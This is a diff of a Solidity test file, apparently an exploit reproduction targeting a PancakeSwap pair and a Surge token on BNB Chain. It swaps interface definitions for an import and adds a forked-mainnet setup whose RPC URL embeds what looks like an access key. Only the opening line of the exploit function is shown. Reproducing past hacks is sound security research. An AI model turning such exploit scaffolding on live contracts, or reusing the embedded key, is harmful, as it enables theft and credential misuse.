@@ -3,32 +3,18 @@
 pragma solidity >=0.7.0 <0.9.0;
 
 import "ds-test/test.sol";
+import "./interface.sol";
 
 interface IpancakePair{
     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
-
     function token0() external view returns (address);
     function token1() external view returns (address);
 
 }
 
-interface WBNB {
-    function deposit() payable external;
-    function withdraw(uint wad) external;
-    function balanceOf(address account) external view returns (uint);
-    function transfer(address recipient, uint amount) external returns (bool);
-}
-
-
 interface Token {
     function balanceOf(address account) external view returns (uint);
     function transfer(address recipient, uint amount) external returns (bool);
-}
-
-interface Surge{
-    function sell(uint256 tokenAmount) external returns (bool);
-    function balanceOf(address account) external view returns (uint256);
-    function transfer(address recipient, uint256 amount) external  returns (bool);
 }
 
 contract ContractTest is DSTest {
@@ -40,6 +26,13 @@ contract ContractTest is DSTest {
     address private constant Pancake_Pair_Address = 0x0eD7e52944161450477ee417DE9Cd3a859b14fD0;
     address public mywallet = msg.sender;
     uint8 public time = 0;
+    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    uint256 mainnetFork;
+    
+    function setUp() public {
+        mainnetFork = cheats.createFork("https://divine-black-wind.bsc.discover.quiknode.pro/64ab050694137dfcbf4c20daec2e94dc515c1d60/", 10087723); // fork bsc at block 10087723
+        cheats.selectFork(mainnetFork);
+    }
 
     function testExploit() public{
        payable(address(0)).transfer(address(this).balance);
